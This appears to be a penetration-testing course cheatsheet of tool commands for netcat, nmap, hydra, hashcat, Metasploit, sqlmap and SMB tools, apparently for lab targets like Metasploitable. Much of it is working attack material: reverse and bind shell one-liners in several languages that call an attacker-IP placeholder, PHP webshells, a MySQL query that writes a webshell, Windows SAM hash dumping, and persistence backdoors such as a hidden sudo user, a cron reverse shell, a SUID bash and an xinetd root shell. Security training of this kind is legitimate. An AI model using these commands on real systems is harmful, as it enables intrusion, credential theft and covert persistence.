---

# 🔴 COMPLETE TOOL CHEATSHEET — SEMESTER 1

Everything you've used, organized for quick reference.

---

## 1. NETCAT (nc) — THE SWISS ARMY KNIFE

### Port Connection
```bash
nc <IP> <port>                  # Connect to a port
nc -v <IP> <port>               # Verbose connection
nc -n <IP> <port>               # No DNS resolution (faster)
```

### Bindshell (Victim Listens)
```bash
# On victim - listen and serve shell
nc -lvp <port> -e /bin/bash
nc -lvp <port> -e /bin/sh
nc -lvp <port> -e cmd.exe        # Windows

# On attacker - connect
nc <victim_ip> <port>
```

### Reverse Shell (Victim Connects Back)
```bash
# On attacker - listen
nc -lvnp <port>

# On victim - connect back
nc -e /bin/bash <attacker_ip> <port>
nc -e /bin/sh <attacker_ip> <port>
```

### Named Pipe Reverse Shell (When -e is Unavailable)
```bash
# On victim
mkfifo /tmp/f; nc <attacker_ip> <port> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f

# On attacker
nc -lvnp <port>
```

### File Transfer
```bash
# Receiver (attacker)
nc -lvnp <port> > received_file

# Sender (victim)
nc <attacker_ip> <port> < file_to_send
```

### Banner Grabbing
```bash
nc <IP> 21    # FTP
nc <IP> 22    # SSH
nc <IP> 25    # SMTP
nc <IP> 80    # HTTP (then type: GET / HTTP/1.1)
```

### Port Scanning (Basic)
```bash
nc -zv <IP> <port>              # Single port
nc -zv <IP> 20-100              # Port range
```

---

## 2. NMAP — NETWORK MAPPER

### Host Discovery
```bash
nmap -sn <IP>/24                 # Ping sweep
nmap -sn -PS 21,22,80,443 <IP>   # TCP SYN ping
nmap -Pn <IP>                    # Skip host discovery (treat as up)
```

### Port Scanning
```bash
nmap -p- <IP>                    # All 65535 ports
nmap -p 1-1000 <IP>              # Port range
nmap -p 21,22,80,443 <IP>        # Specific ports
nmap --top-ports 100 <IP>        # Top 100 common ports
nmap -F <IP>                     # Fast scan (top 100)
```

### Scan Techniques
```bash
nmap -sS <IP>                    # SYN stealth (default, needs root)
nmap -sT <IP>                    # TCP connect (no root needed)
nmap -sU <IP>                    # UDP scan (slow)
nmap -sA <IP>                    # ACK scan (firewall rules)
nmap -sV <IP>                    # Version detection
nmap -O <IP>                     # OS detection
nmap -A <IP>                     # Aggressive (OS, version, scripts, traceroute)
```

### Timing & Stealth
```bash
nmap -T0 <IP>                    # Paranoid (slowest, IDS evasion)
nmap -T1 <IP>                    # Sneaky
nmap -T2 <IP>                    # Polite (slower, less bandwidth)
nmap -T3 <IP>                    # Normal (default)
nmap -T4 <IP>                    # Aggressive (fast)
nmap -T5 <IP>                    # Insane (fastest, noisy)

# Stealth options
nmap -sS -Pn -T2 --max-retries=1 --data-length=24 <IP>
nmap --source-port 443 <IP>      # Spoof source port
nmap -D RND:10 <IP>              # Decoy scan
```

### NSE Scripts
```bash
nmap --script vuln <IP>          # Vulnerability scan
nmap --script http-title <IP>    # Web page titles
nmap --script ftp-brute <IP>     # FTP brute force
nmap --script smb-enum-shares <IP>  # SMB enumeration
nmap --script mysql-info <IP>    # MySQL information
```

### Output Formats
```bash
nmap -oN output.txt <IP>         # Normal output
nmap -oX output.xml <IP>         # XML output
nmap -oG output.gnmap <IP>       # Grepable output
nmap -oA output <IP>             # All formats
```

---

## 3. WIRESHARK — PACKET ANALYSIS

### Capture Filters (Before Capture)
```
host 192.168.100.46              # Specific host
src 192.168.100.46               # Source only
dst 192.168.100.46               # Destination only
port 80                          # Specific port
port 23 or port 21               # Multiple ports
tcp                              # TCP only
udp                              # UDP only
not arp                          # Exclude ARP
host 192.168.100.46 and port 23  # Combined
```

### Display Filters (After Capture)
```
tcp.flags.syn == 1               # SYN packets
tcp.flags.reset == 1             # RST packets
http                             # HTTP traffic
ssh                              # SSH traffic
ftp                              # FTP traffic
dns                              # DNS traffic
arp                              # ARP traffic
http.request                     # HTTP requests
http.response                    # HTTP responses
tcp.stream eq 0                  # Follow TCP stream
```

### Follow TCP Stream
Right-click any packet → Follow → TCP Stream
- Shows entire conversation
- Cleartext protocols (Telnet, HTTP, FTP) are fully readable
- Encrypted protocols (SSH, HTTPS) show gibberish

---

## 4. TCPDUMP — COMMAND-LINE PACKET CAPTURE

```bash
tcpdump -i eth0                  # Capture on interface
tcpdump -i eth0 port 23          # Filter by port
tcpdump -i eth0 host 192.168.100.46  # Filter by host
tcpdump -i eth0 -w capture.pcap  # Write to file
tcpdump -r capture.pcap          # Read from file
tcpdump -r capture.pcap -A       # Read as ASCII
tcpdump -r capture.pcap -A | grep password  # Search for passwords
tcpdump -i eth0 -n               # No DNS resolution
tcpdump -i eth0 -X               # Show hex and ASCII
```

---

## 5. GOBUSTER — DIRECTORY/FILE BRUTE FORCE

### Directory Mode
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<IP> -w wordlist.txt -x php,html,txt,bak
gobuster dir -u http://<IP> -w wordlist.txt -t 50     # 50 threads
gobuster dir -u http://<IP> -w wordlist.txt -o output.txt
```

### DNS Mode
```bash
gobuster dns -d domain.com -w subdomains.txt
```

### VHOST Mode
```bash
gobuster vhost -u http://<IP> -w vhosts.txt
```

### Common Wordlists
```
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
```

---

## 6. CURL — HTTP CLIENT

### Basic Requests
```bash
curl http://<IP>                        # GET request
curl -I http://<IP>                     # Headers only
curl -v http://<IP>                     # Verbose (show headers + response)
curl -X POST http://<IP>/login.php      # POST request
curl -d "user=admin&pass=admin" http://<IP>/login.php  # POST with data
```

### Authentication
```bash
curl -u admin:password http://<IP>      # Basic auth
curl --cookie "PHPSESSID=xxx" http://<IP>  # Cookie
```

### File Operations
```bash
curl -o file.html http://<IP>           # Save to file
curl -O http://<IP>/file.zip           # Save with remote name
curl -T file.txt ftp://<IP>/           # Upload via FTP
```

### HTTP/0.9 (Old Servers)
```bash
curl --http0.9 http://<IP>
```

### Wrapper/Filter Requests
```bash
curl "http://<IP>/page=php://filter/convert.base64-encode/resource=index"
curl -X POST "http://<IP>/page=php://input" -d "<?php system('id'); ?>"
```

---

## 7. HYDRA — BRUTE FORCE

### SSH
```bash
hydra -l <username> -P passwords.txt ssh://<IP>
hydra -L users.txt -p <password> ssh://<IP>
hydra -L users.txt -P passwords.txt ssh://<IP>
hydra -L users.txt -e ns ssh://<IP>    # -e ns = try null and same as login
```

### FTP
```bash
hydra -l <username> -P passwords.txt ftp://<IP>
```

### HTTP POST Login
```bash
hydra -l admin -P passwords.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid login"
```

### MySQL
```bash
hydra -l root -P passwords.txt mysql://<IP>
```

### VNC
```bash
hydra -P passwords.txt vnc://<IP>
```

---

## 8. JOHN THE RIPPER — PASSWORD CRACKING

### Hash Identification
```bash
john hash.txt                        # Auto-detect
john --list=formats | grep -i md5   # List available formats
```

### Wordlist Mode
```bash
john --wordlist=rockyou.txt hash.txt
john --wordlist=rockyou.txt --rules hash.txt
```

### Specific Hash Formats
```bash
john --format=raw-md5 hash.txt          # Raw MD5
john --format=md5crypt hash.txt         # Linux $1$ MD5
john --format=sha512crypt hash.txt      # Linux $6$ SHA512
```

### Show Results
```bash
john --show hash.txt
john --show --format=raw-md5 hash.txt
cat ~/.john/john.pot                    # Cracked passwords stored here
```

### Brute Force
```bash
john --incremental hash.txt            # Full brute force (slow)
john --incremental=digits hash.txt     # Digits only
john --incremental=alpha hash.txt      # Letters only
```

---

## 9. HASHCAT — GPU-ACCELERATED CRACKING

### Hash Identification
```bash
hashcat --identify hash.txt
```

### Attack Modes
```bash
# Wordlist (0)
hashcat -m 0 -a 0 hash.txt rockyou.txt

# Wordlist + Rules (0 + rules)
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute Force (3)
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# Mask Attack (3)
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?l?l?d?d

# Hybrid: Wordlist + Mask (6)
hashcat -m 0 -a 6 hash.txt rockyou.txt ?d?d?d

# Hybrid: Mask + Wordlist (7)
hashcat -m 0 -a 7 hash.txt ?d?d?d rockyou.txt
```

### Common Hash Modes (-m)
```
0       MD5
100     SHA1
1400    SHA256
1700    SHA512
500     md5crypt ($1$)
1800    sha512crypt ($6$)
1000    NTLM
3000    LM
17600   ZIP
11600   7-Zip
```

### Masks
```
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s = !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00 - 0xff
```

### Windows Password Hashes
```bash
# Dump hashes (from Windows)
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Crack
hashcat -m 1000 hash.txt rockyou.txt
```

### ZIP/RAR
```bash
# Extract hash
zip2john archive.zip > hash.txt
rar2john archive.rar > hash.txt

# Crack
hashcat -m 13600 hash.txt rockyou.txt    # ZIP2
hashcat -m 13000 hash.txt rockyou.txt    # RAR5
```

### SSH Private Key
```bash
# Extract hash
ssh2john id_rsa > hash.txt

# Crack
hashcat -m 22921 hash.txt rockyou.txt
```

---

## 10. METASPLOIT (MSFCONSOLE)

### Basic Commands
```bash
msfconsole                     # Start
search <term>                  # Search for exploits
use <module>                   # Select module
show options                   # Show required options
show payloads                  # Show compatible payloads
set <option> <value>           # Set option
setg <option> <value>          # Set globally
unset <option>                 # Clear option
exploit / run                  # Execute
sessions -l                    # List sessions
sessions -i <id>               # Interact with session
background                     # Background session (Ctrl+Z)
back                           # Go back to previous module
exit                           # Quit
```

### Common Modules
```bash
use exploit/multi/samba/usermap_script
use exploit/unix/ftp/vsftpd_234_backdoor
use exploit/unix/irc/unreal_ircd_3281_backdoor
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/mysql/mysql_login
```

### Payloads
```bash
# Reverse shell
set PAYLOAD cmd/unix/reverse
set PAYLOAD cmd/unix/reverse_netcat
set PAYLOAD php/meterpreter_reverse_tcp
set PAYLOAD windows/meterpreter/reverse_tcp

# Bindshell
set PAYLOAD cmd/unix/bind_netcat
set PAYLOAD windows/meterpreter/bind_tcp
```

### Resource Scripts
```bash
# Create .rc file
echo "use exploit/multi/samba/usermap_script
set RHOSTS 192.168.100.46
set LHOST 192.168.100.18
exploit" > samba.rc

msfconsole -r samba.rc
```

---

## 11. SQLMAP

### Basic Scanning
```bash
sqlmap -u "http://<IP>/page.php?id=1"
sqlmap -u "http://<IP>/page.php?id=1" --dbs
sqlmap -u "http://<IP>/page.php?id=1" --tables
sqlmap -u "http://<IP>/page.php?id=1" -D database --tables
sqlmap -u "http://<IP>/page.php?id=1" -D database -T table --dump
```

### POST Requests
```bash
sqlmap -u "http://<IP>/login.php" --data="user=admin&pass=admin"
```

### Direct Database Connection
```bash
sqlmap -d "mysql://root:password@192.168.100.46:3306/database" --tables
```

### OS Shell
```bash
sqlmap -u "http://<IP>/page.php?id=1" --os-shell
```

### Bypass WAF
```bash
sqlmap -u "http://<IP>/page.php?id=1" --tamper=space2comment
sqlmap -u "http://<IP>/page.php?id=1" --level=5 --risk=3
```

---

## 12. SAMBA / SMB TOOLS

### smbclient
```bash
smbclient -L //<IP> -N                    # List shares (anonymous)
smbclient //<IP>/share -N                  # Connect to share
smbclient //<IP>/share -U username         # Connect with user
# Commands inside smbclient: ls, get, put, cd, quit
```

### enum4linux
```bash
enum4linux <IP>                            # Full enumeration
enum4linux -U <IP>                         # User list
enum4linux -S <IP>                         # Share list
```

### Mount SMB Share
```bash
mount -t cifs //<IP>/share /mnt -o username=user,password=pass
```

---

## 13. MYSQL

### Connection
```bash
mysql -h <IP> -u root -p
mysql -h <IP> -u root --skip-ssl
mysql -h <IP> -u root --skip-ssl -e "SHOW DATABASES;"
```

### Commands Once Connected
```sql
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM table_name;
DESCRIBE table_name;
```

### File Operations
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/shell.php';
SHOW VARIABLES LIKE 'secure_file_priv';
```

---

## 14. ARP SPOOFING & MITM

```bash
# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo sysctl net.ipv4.ip_forward=1

# ARP spoof victim (tell victim you're the gateway)
sudo arpspoof -i eth0 -t <victim_ip> <gateway_ip>

# ARP spoof gateway (tell gateway you're the victim)
sudo arpspoof -i eth0 -t <gateway_ip> <victim_ip>
```

---

## 15. WEBSHELLS

### PHP Simple
```php
<?php system($_GET['cmd']); ?>
```

### PHP with Form
```php
<html><body>
<form method="GET">
<input type="text" name="cmd" size="80">
<input type="submit" value="Execute">
</form>
<pre><?php if(isset($_GET['cmd'])) system($_GET['cmd']); ?></pre>
</body></html>
```

### PHP Reverse Shell
```php
<?php
$sock=fsockopen("ATTACKER_IP",PORT);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

---

## 16. LINUX PRIVILEGE ESCALATION COMMANDS

```bash
# System info
uname -a; cat /etc/issue; hostname

# Current user
whoami; id; groups; sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null

# Cron jobs
cat /etc/crontab; ls -la /etc/cron.*

# Running processes
ps aux | grep root

# Network
netstat -tulpn; ifconfig

# Passwords in files
grep -r "password" /etc/ 2>/dev/null
find / -name "*.bak" -o -name "*~" 2>/dev/null
cat /home/*/.bash_history
```

---

## 17. FILE TRANSFER METHODS

```bash
# Netcat (no encryption)
# Receiver: nc -lvnp 4444 > file
# Sender:   nc <IP> 4444 < file

# Python HTTP Server (host on attacker)
python3 -m http.server 8000
# Download on victim: wget http://<attacker_ip>:8000/file

# wget / curl
wget http://<IP>/file -O /tmp/file
curl http://<IP>/file -o /tmp/file

# Base64 (small files)
base64 < file         # Encode on sender
echo "BASE64==" | base64 -d > file  # Decode on receiver
```

---

## 18. PERSISTENCE TECHNIQUES

```bash
# New user with sudo
useradd -m -s /bin/bash backdoor
echo "backdoor:Password123" | chpasswd
usermod -aG sudo backdoor

# SSH key
echo "PUBLIC_KEY" >> /root/.ssh/authorized_keys

# Cron job
echo "* * * * * root /bin/bash -c 'nc <IP> <port> -e /bin/bash'" >> /etc/crontab

# SUID bash
cp /bin/bash /tmp/.bash; chmod 4777 /tmp/.bash

# Xinetd backdoor
echo "service bd { type=UNLISTED; port=44444; socket_type=stream; wait=no; user=root; server=/bin/bash; server_args=-i; }" > /etc/xinetd.d/backdoor
```

---

## 19. REVERSE SHELL ONE-LINERS

```bash
# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1

# Netcat
nc -e /bin/bash IP PORT

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 20. QUICK REFERENCE: PORT NUMBERS

| Port | Service |
|:--|:--|
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 111 | RPC |
| 139 | NetBIOS |
| 143 | IMAP |
| 443 | HTTPS |
| 445 | SMB |
| 512-514 | R-Services |
| 1099 | Java RMI |
| 1524 | Metasploitable bindshell |
| 2049 | NFS |
| 3306 | MySQL |
| 3389 | RDP |
| 5432 | PostgreSQL |
| 5900 | VNC |
| 6667 | IRC |
| 8080 | HTTP Proxy/Tomcat |
| 8180 | Apache Tomcat |

---
